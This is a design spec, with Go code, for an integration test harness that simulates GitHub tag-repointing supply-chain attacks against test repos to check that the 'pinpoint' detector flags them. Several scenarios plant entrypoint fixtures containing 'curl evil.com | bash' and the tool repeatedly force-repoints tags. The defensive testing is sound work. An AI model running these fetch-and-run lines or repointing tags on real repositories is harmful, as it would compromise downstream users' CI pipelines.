# Spec 002: Integration Test Harness

## Summary

Automated end-to-end tests that create real GitHub repos, execute real attack
scenarios (tag repointing, deletion, mass repoint), and verify that pinpoint
detects them correctly. Uses the `pinpoint-testing` GitHub org.

**All API operations in this spec have been verified against live GitHub API
on 2026-03-21 using the pinpoint-testing org.**

## Prerequisites

- GitHub org: `pinpoint-testing` (already created)
- `GITHUB_TOKEN` with `repo` scope and org member access
- For cleanup: `delete_repo` scope (run `gh auth refresh -h github.com -s delete_repo`)
- pinpoint binary built: `go build ./cmd/pinpoint/`

## File Structure

```
tests/
  harness/
    harness.go          — GitHub API helpers (create repo, commit, tag, repoint)
    harness_test.go     — Integration tests (build tag: integration)
```

Keep it flat and simple. No YAML scenario files — scenarios are Go test
functions. Easier to debug, easier to extend, no parsing layer.

## GitHub API Helper: Verified Operations

All operations go through `tests/harness/harness.go`. This file provides
a `TestHelper` struct with methods for every Git data operation needed.

### Types

```go
//go:build integration

package harness

import (
    "context"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "strings"
    "testing"
    "time"
    "bytes"
    "io"
)

type TestHelper struct {
    token   string
    org     string
    client  *http.Client
    baseURL string
}

func NewTestHelper(t *testing.T) *TestHelper {
    t.Helper()
    token := os.Getenv("GITHUB_TOKEN")
    if token == "" {
        t.Fatal("GITHUB_TOKEN required for integration tests")
    }
    return &TestHelper{
        token:   token,
        org:     "pinpoint-testing",
        client:  &http.Client{Timeout: 30 * time.Second},
        baseURL: "https://api.github.com",
    }
}
```

### Create Repository

```go
// CreateRepo creates a public repo with a README in the test org.
// Returns the SHA of the initial commit on main.
func (h *TestHelper) CreateRepo(t *testing.T, name string) string {
    t.Helper()

    // Create repo with auto-init (creates README + initial commit)
    h.apiPost(t, fmt.Sprintf("/orgs/%s/repos", h.org), map[string]interface{}{
        "name":        name,
        "description": "Pinpoint integration test fixture",
        "auto_init":   true,
        "visibility":  "public",
    })

    // Wait for GitHub to initialize (auto_init is async)
    time.Sleep(2 * time.Second)

    // Get main branch HEAD
    return h.getRef(t, name, "heads/main")
}
```

**Verified:** `POST /orgs/pinpoint-testing/repos` with `auto_init: true` creates
repo with README and initial commit. Tested 2026-03-21.

### Create Blob

```go
// CreateBlob creates a file blob and returns its SHA.
func (h *TestHelper) CreateBlob(t *testing.T, repo, content string) string {
    t.Helper()
    resp := h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/blobs", h.org, repo),
        map[string]interface{}{
            "content":  content,
            "encoding": "utf-8",
        })
    return resp["sha"].(string)
}
```

**Verified:** Returns blob SHA. Example: `"1ae262b0517f3d0fd23419796b4c1e1655c0c446"`

### Create Tree

```go
// CreateTree creates a tree with the given files based on a parent tree.
// files is a map of path -> blob SHA.
func (h *TestHelper) CreateTree(t *testing.T, repo, baseTree string, files map[string]string) string {
    t.Helper()
    var treeEntries []map[string]string
    for path, blobSHA := range files {
        treeEntries = append(treeEntries, map[string]string{
            "path": path,
            "mode": "100755",
            "type": "blob",
            "sha":  blobSHA,
        })
    }
    resp := h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/trees", h.org, repo),
        map[string]interface{}{
            "base_tree": baseTree,
            "tree":      treeEntries,
        })
    return resp["sha"].(string)
}
```

**Verified:** `base_tree` must be a commit SHA (not a tree SHA). The tree
entries must use `--input` style JSON, not `-f` flags. Tested 2026-03-21.

### Create Commit

```go
// CreateCommit creates a commit with the given tree and parents.
func (h *TestHelper) CreateCommit(t *testing.T, repo, message, treeSHA string, parents []string) string {
    t.Helper()
    resp := h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/commits", h.org, repo),
        map[string]interface{}{
            "message": message,
            "tree":    treeSHA,
            "parents": parents,
        })
    return resp["sha"].(string)
}
```

### Update Branch

```go
// UpdateBranch moves a branch ref to a new commit SHA.
func (h *TestHelper) UpdateBranch(t *testing.T, repo, branch, sha string) {
    t.Helper()
    h.apiPatch(t, fmt.Sprintf("/repos/%s/%s/git/refs/heads/%s", h.org, repo, branch),
        map[string]interface{}{
            "sha":   sha,
            "force": true,
        })
}
```

### Create Lightweight Tag

```go
// CreateLightweightTag creates a tag ref pointing directly to a commit.
func (h *TestHelper) CreateLightweightTag(t *testing.T, repo, tag, commitSHA string) {
    t.Helper()
    h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/refs", h.org, repo),
        map[string]interface{}{
            "ref": "refs/tags/" + tag,
            "sha": commitSHA,
        })
}
```

**Verified:** `POST /repos/{owner}/{repo}/git/refs` with `ref: "refs/tags/v1.0.0"`.
Tested 2026-03-21.

### Create Annotated Tag

```go
// CreateAnnotatedTag creates an annotated tag object and a ref pointing to it.
func (h *TestHelper) CreateAnnotatedTag(t *testing.T, repo, tag, commitSHA, message string) {
    t.Helper()
    // Step 1: Create tag object
    tagObj := h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/tags", h.org, repo),
        map[string]interface{}{
            "tag":     tag,
            "message": message,
            "object":  commitSHA,
            "type":    "commit",
            "tagger": map[string]string{
                "name":  "Pinpoint Test",
                "email": "test@pinpoint.dev",
                "date":  time.Now().UTC().Format(time.RFC3339),
            },
        })
    tagObjSHA := tagObj["sha"].(string)

    // Step 2: Create ref pointing to tag object
    h.apiPost(t, fmt.Sprintf("/repos/%s/%s/git/refs", h.org, repo),
        map[string]interface{}{
            "ref": "refs/tags/" + tag,
            "sha": tagObjSHA,
        })
}
```

**Verified:** Two-step process. Step 1 returns tag object SHA (e.g.,
`"5b358f2f21489edaab9edb0ff2e2b024a7017bdb"`). Step 2 creates the ref.
Tested 2026-03-21.

### Force-Push (Repoint) Tag

```go
// RepointTag force-pushes an existing tag to a new commit SHA.
// This is THE attack operation we're testing against.
func (h *TestHelper) RepointTag(t *testing.T, repo, tag, newSHA string) {
    t.Helper()
    h.apiPatch(t, fmt.Sprintf("/repos/%s/%s/git/refs/tags/%s", h.org, repo, tag),
        map[string]interface{}{
            "sha":   newSHA,
            "force": true,
        })
}
```

**Verified:** `PATCH /repos/{owner}/{repo}/git/refs/tags/{tag}` with
`force: true`. This is the exact operation the Trivy attacker used.
Tested 2026-03-21.

### Delete Tag

```go
// DeleteTag removes a tag entirely.
func (h *TestHelper) DeleteTag(t *testing.T, repo, tag string) {
    t.Helper()
    h.apiDelete(t, fmt.Sprintf("/repos/%s/%s/git/refs/tags/%s", h.org, repo, tag))
}
```

**Verified:** `DELETE /repos/{owner}/{repo}/git/refs/tags/{tag}`.
Returns 204 No Content. Tested 2026-03-21.

### Delete Repository

```go
// DeleteRepo removes a test repo. Requires delete_repo scope.
func (h *TestHelper) DeleteRepo(t *testing.T, name string) {
    t.Helper()
    h.apiDelete(t, fmt.Sprintf("/repos/%s/%s", h.org, name))
}
```

**Note:** Requires `delete_repo` scope on the token. If the token doesn't
have this scope, log a warning and skip cleanup (don't fail the test).

### Generic API Helpers

```go
func (h *TestHelper) apiPost(t *testing.T, path string, body interface{}) map[string]interface{} {
    t.Helper()
    data, _ := json.Marshal(body)
    req, _ := http.NewRequest("POST", h.baseURL+path, bytes.NewReader(data))
    req.Header.Set("Authorization", "Bearer "+h.token)
    req.Header.Set("Accept", "application/vnd.github+json")
    req.Header.Set("Content-Type", "application/json")
    resp, err := h.client.Do(req)
    if err != nil {
        t.Fatalf("API POST %s: %v", path, err)
    }
    defer resp.Body.Close()
    respBody, _ := io.ReadAll(resp.Body)
    if resp.StatusCode >= 300 {
        t.Fatalf("API POST %s returned %d: %s", path, resp.StatusCode, string(respBody))
    }
    var result map[string]interface{}
    json.Unmarshal(respBody, &result)
    return result
}

func (h *TestHelper) apiPatch(t *testing.T, path string, body interface{}) map[string]interface{} {
    t.Helper()
    data, _ := json.Marshal(body)
    req, _ := http.NewRequest("PATCH", h.baseURL+path, bytes.NewReader(data))
    req.Header.Set("Authorization", "Bearer "+h.token)
    req.Header.Set("Accept", "application/vnd.github+json")
    req.Header.Set("Content-Type", "application/json")
    resp, err := h.client.Do(req)
    if err != nil {
        t.Fatalf("API PATCH %s: %v", path, err)
    }
    defer resp.Body.Close()
    respBody, _ := io.ReadAll(resp.Body)
    if resp.StatusCode >= 300 {
        t.Fatalf("API PATCH %s returned %d: %s", path, resp.StatusCode, string(respBody))
    }
    var result map[string]interface{}
    json.Unmarshal(respBody, &result)
    return result
}

func (h *TestHelper) apiDelete(t *testing.T, path string) {
    t.Helper()
    req, _ := http.NewRequest("DELETE", h.baseURL+path, nil)
    req.Header.Set("Authorization", "Bearer "+h.token)
    req.Header.Set("Accept", "application/vnd.github+json")
    resp, err := h.client.Do(req)
    if err != nil {
        t.Fatalf("API DELETE %s: %v", path, err)
    }
    resp.Body.Close()
    if resp.StatusCode >= 300 && resp.StatusCode != 404 {
        t.Fatalf("API DELETE %s returned %d", path, resp.StatusCode)
    }
}

func (h *TestHelper) getRef(t *testing.T, repo, ref string) string {
    t.Helper()
    req, _ := http.NewRequest("GET", fmt.Sprintf("%s/repos/%s/%s/git/refs/%s",
        h.baseURL, h.org, repo, ref), nil)
    req.Header.Set("Authorization", "Bearer "+h.token)
    req.Header.Set("Accept", "application/vnd.github+json")
    resp, err := h.client.Do(req)
    if err != nil {
        t.Fatalf("API GET ref %s: %v", ref, err)
    }
    defer resp.Body.Close()
    var result struct {
        Object struct {
            SHA string `json:"sha"`
        } `json:"object"`
    }
    json.NewDecoder(resp.Body).Decode(&result)
    return result.Object.SHA
}
```

### Running Pinpoint From Tests

```go
// RunPinpointScan executes pinpoint scan and returns stdout+stderr and exit code.
func RunPinpointScan(t *testing.T, configPath, statePath string) (string, int) {
    t.Helper()
    token := os.Getenv("GITHUB_TOKEN")
    cmd := exec.Command("go", "run", "./cmd/pinpoint/", "scan",
        "--config", configPath,
        "--state", statePath,
        "--json")
    cmd.Env = append(os.Environ(), "GITHUB_TOKEN="+token)
    cmd.Dir = findProjectRoot(t) // Walk up to find go.mod
    out, err := cmd.CombinedOutput()
    exitCode := 0
    if err != nil {
        if exitErr, ok := err.(*exec.ExitError); ok {
            exitCode = exitErr.ExitCode()
        } else {
            t.Fatalf("Failed to run pinpoint: %v", err)
        }
    }
    return string(out), exitCode
}

func findProjectRoot(t *testing.T) string {
    t.Helper()
    dir, _ := os.Getwd()
    for {
        if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
            return dir
        }
        parent := filepath.Dir(dir)
        if parent == dir {
            t.Fatal("Could not find project root (go.mod)")
        }
        dir = parent
    }
}
```

---

## Test Scenarios

All tests go in `tests/harness/harness_test.go` with `//go:build integration`.

Each test follows the pattern:
1. Create repo with known state
2. Run pinpoint scan (baseline)
3. Execute attack
4. Run pinpoint scan again
5. Assert alerts
6. Cleanup

### Scenario 1: Single Semver Tag Repoint

```go
func TestScenario_SingleRepoint(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-single-repoint"

    // Setup
    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    blob := h.CreateBlob(t, repo, "#!/bin/bash\necho legit\n")
    tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
    goodCommit := h.CreateCommit(t, repo, "Legit release", tree, []string{mainSHA})
    h.UpdateBranch(t, repo, "main", goodCommit)
    h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

    // Baseline scan
    cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
    state := t.TempDir() + "/state.json"
    _, code := RunPinpointScan(t, cfg, state)
    if code != 0 {
        t.Fatal("Baseline scan should succeed with exit 0")
    }

    // Attack: create orphan commit, repoint tag
    evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
    evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
    evilCommit := h.CreateCommit(t, repo, "Upgrade trivy (#369)", evilTree, []string{mainSHA})
    // NOTE: evilCommit is on main branch (same parent), so create a truly orphan one:
    // Use initial README commit as parent to diverge from main
    initialSHA := h.getRef(t, repo, "heads/main") // Current HEAD
    evilCommit2 := h.CreateCommit(t, repo, "Evil orphan", evilTree, []string{goodCommit})
    // Actually to be truly off-branch, don't update main. Just repoint the tag:
    h.RepointTag(t, repo, "v1.0.0", evilCommit)

    // Detection scan
    output, code := RunPinpointScan(t, cfg, state)
    if code != 2 {
        t.Fatalf("Expected exit code 2 (alert), got %d. Output: %s", code, output)
    }
    assertContains(t, output, "TAG_REPOINTED")
    assertContains(t, output, "SEMVER_REPOINT")
}
```

### Scenario 2: Mass Repoint (75 tags)

```go
func TestScenario_MassRepoint(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-mass-repoint"

    // Setup: create 75 tags
    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
    tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})

    var tagNames []string
    prevSHA := mainSHA
    for i := 0; i < 75; i++ {
        commit := h.CreateCommit(t, repo, fmt.Sprintf("Release v1.%d.0", i), tree, []string{prevSHA})
        tag := fmt.Sprintf("v1.%d.0", i)
        h.CreateLightweightTag(t, repo, tag, commit)
        tagNames = append(tagNames, tag)
        prevSHA = commit
        // Don't move main — we want these to be on-branch but the evil commit to be off
    }
    h.UpdateBranch(t, repo, "main", prevSHA)

    // Baseline
    cfg := writeConfig(t, h.org+"/"+repo, tagNames)
    state := t.TempDir() + "/state.json"
    RunPinpointScan(t, cfg, state)

    // Attack: repoint ALL 75 tags to a single evil commit
    evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com/steal | bash\n")
    evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
    evilCommit := h.CreateCommit(t, repo, "Evil mass repoint", evilTree, []string{mainSHA})

    for _, tag := range tagNames {
        h.RepointTag(t, repo, tag, evilCommit)
    }

    // Detection
    output, code := RunPinpointScan(t, cfg, state)
    if code != 2 {
        t.Fatalf("Expected exit code 2, got %d", code, output)
    }
    assertContains(t, output, "TAG_REPOINTED")
    assertContains(t, output, "MASS_REPOINT")
}
```

### Scenario 3: Tag Delete + Recreate

```go
func TestScenario_DeleteRecreate(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-delete-recreate"

    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
    tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
    goodCommit := h.CreateCommit(t, repo, "Good release", tree, []string{mainSHA})
    h.UpdateBranch(t, repo, "main", goodCommit)
    h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

    // Baseline
    cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
    state := t.TempDir() + "/state.json"
    RunPinpointScan(t, cfg, state)

    // Attack: delete then recreate with different SHA
    h.DeleteTag(t, repo, "v1.0.0")

    evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
    evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
    evilCommit := h.CreateCommit(t, repo, "Evil recreate", evilTree, []string{mainSHA})
    h.CreateLightweightTag(t, repo, "v1.0.0", evilCommit)

    // Detection — should detect SHA changed
    output, code := RunPinpointScan(t, cfg, state)
    if code != 2 {
        t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
    }
    assertContains(t, output, "TAG_REPOINTED")
}
```

### Scenario 4: Annotated Tag Repoint

```go
func TestScenario_AnnotatedRepoint(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-annotated-repoint"

    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    blob := h.CreateBlob(t, repo, "#!/bin/bash\necho ok\n")
    tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
    goodCommit := h.CreateCommit(t, repo, "Good", tree, []string{mainSHA})
    h.UpdateBranch(t, repo, "main", goodCommit)
    h.CreateAnnotatedTag(t, repo, "v1", goodCommit, "Version 1.0")

    // Baseline
    cfg := writeConfig(t, h.org+"/"+repo, []string{"v1"})
    state := t.TempDir() + "/state.json"
    RunPinpointScan(t, cfg, state)

    // Attack: delete annotated tag, recreate pointing to evil commit
    h.DeleteTag(t, repo, "v1")

    evilBlob := h.CreateBlob(t, repo, "#!/bin/bash\ncurl evil.com | bash\n")
    evilTree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": evilBlob})
    evilCommit := h.CreateCommit(t, repo, "Evil", evilTree, []string{mainSHA})
    h.CreateAnnotatedTag(t, repo, "v1", evilCommit, "Version 1.0 (evil)")

    // Detection
    output, code := RunPinpointScan(t, cfg, state)
    if code != 2 {
        t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
    }
    assertContains(t, output, "TAG_REPOINTED")
}
```

### Scenario 5: Legitimate Major Version Advance (False Positive Test)

```go
func TestScenario_LegitimateAdvance(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-legit-advance"

    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    blob := h.CreateBlob(t, repo, "#!/bin/bash\necho v1\n")
    tree := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": blob})
    commit1 := h.CreateCommit(t, repo, "v1 initial", tree, []string{mainSHA})
    h.UpdateBranch(t, repo, "main", commit1)
    h.CreateAnnotatedTag(t, repo, "v1", commit1, "Major v1")

    // Baseline
    cfg := writeConfig(t, h.org+"/"+repo, []string{"v1"})
    state := t.TempDir() + "/state.json"
    RunPinpointScan(t, cfg, state)

    // Legitimate: new commit on main (descendant), advance v1
    blob2 := h.CreateBlob(t, repo, "#!/bin/bash\necho v1-patched\n")
    tree2 := h.CreateTree(t, repo, commit1, map[string]string{"entrypoint.sh": blob2})
    commit2 := h.CreateCommit(t, repo, "v1 patch", tree2, []string{commit1})
    h.UpdateBranch(t, repo, "main", commit2)

    // Move v1 forward (delete + recreate since annotated)
    h.DeleteTag(t, repo, "v1")
    h.CreateAnnotatedTag(t, repo, "v1", commit2, "Major v1 updated")

    // Detection — should detect but at LOW severity
    output, code := RunPinpointScan(t, cfg, state)
    // May or may not trigger exit code 2 depending on min_severity config
    // The key assertion: severity should be LOW, not CRITICAL
    if strings.Contains(output, "CRITICAL") {
        t.Fatalf("Legitimate major version advance should not be CRITICAL. Output: %s", output)
    }
}
```

### Scenario 6: Entry Point Size Change

```go
func TestScenario_SizeChange(t *testing.T) {
    h := NewTestHelper(t)
    repo := "test-size-change"

    mainSHA := h.CreateRepo(t, repo)
    defer h.DeleteRepo(t, repo)

    // Small entrypoint (100 bytes)
    smallContent := "#!/bin/bash\necho ok\n" + strings.Repeat(" ", 80)
    smallBlob := h.CreateBlob(t, repo, smallContent)
    tree1 := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": smallBlob})
    goodCommit := h.CreateCommit(t, repo, "Small entry", tree1, []string{mainSHA})
    h.UpdateBranch(t, repo, "main", goodCommit)
    h.CreateLightweightTag(t, repo, "v1.0.0", goodCommit)

    // Baseline
    cfg := writeConfig(t, h.org+"/"+repo, []string{"v1.0.0"})
    state := t.TempDir() + "/state.json"
    RunPinpointScan(t, cfg, state)

    // Attack: repoint to commit with huge entrypoint (5000 bytes)
    bigContent := "#!/bin/bash\ncurl evil.com | bash\n" + strings.Repeat("# padding\n", 500)
    bigBlob := h.CreateBlob(t, repo, bigContent)
    tree2 := h.CreateTree(t, repo, mainSHA, map[string]string{"entrypoint.sh": bigBlob})
    evilCommit := h.CreateCommit(t, repo, "Big entry", tree2, []string{mainSHA})
    h.RepointTag(t, repo, "v1.0.0", evilCommit)

    // Detection
    output, code := RunPinpointScan(t, cfg, state)
    if code != 2 {
        t.Fatalf("Expected exit code 2, got %d. Output: %s", code, output)
    }
    assertContains(t, output, "TAG_REPOINTED")
    assertContains(t, output, "SIZE_ANOMALY")
}
```

---

## Utility Functions

```go
func writeConfig(t *testing.T, repo string, tags []string) string {
    t.Helper()
    dir := t.TempDir()
    path := filepath.Join(dir, "config.yml")

    var tagList string
    for _, tag := range tags {
        tagList += fmt.Sprintf("      - %q\n", tag)
    }

    content := fmt.Sprintf(`actions:
  - repo: %s
    tags:
%s
alerts:
  min_severity: low
  stdout: true
store:
  path: %s/state.json
`, repo, tagList, dir)

    os.WriteFile(path, []byte(content), 0644)
    return path
}

func assertContains(t *testing.T, output, substr string) {
    t.Helper()
    if !strings.Contains(output, substr) {
        t.Errorf("Expected output to contain %q, got:\n%s", substr, output)
    }
}
```

---

## Running the Tests

```bash
# From the project root
cd /home/joshf/pinpoint

# Run all integration scenarios
GITHUB_TOKEN=$(gh auth token) go test ./tests/harness/ \
    -tags integration -v -timeout 30m

# Run a specific scenario
GITHUB_TOKEN=$(gh auth token) go test ./tests/harness/ \
    -tags integration -v -timeout 10m \
    -run TestScenario_SingleRepoint
```

**Important:** These tests create and modify REAL repos on GitHub. They
are slow (~2-5 min per scenario due to API latency and sleep timers).
They should NEVER run in CI automatically — only manually or in a
dedicated integration test workflow with explicit trigger.

## Rate Limit Budget

Per scenario: ~15-20 API calls (create repo, blobs, trees, commits, tags, repoints)
6 scenarios × 20 = ~120 API calls total
Mass repoint scenario: +75 extra (one per tag repoint)
Total: ~195 API calls. Well within REST limit (5,000/hr).

## Files to Create

- CREATE: `tests/harness/harness.go` — TestHelper + all API methods above
- CREATE: `tests/harness/harness_test.go` — All 6 scenario tests
- Both files MUST have `//go:build integration` as the first line

## Build Verification

```bash
# Must compile (even without running integration tests)
go build ./...
go vet ./...

# Unit tests must still pass
go test ./... -v

# Integration tests (manual, requires GITHUB_TOKEN)
GITHUB_TOKEN=$(gh auth token) go test ./tests/harness/ -tags integration -v -timeout 30m
```
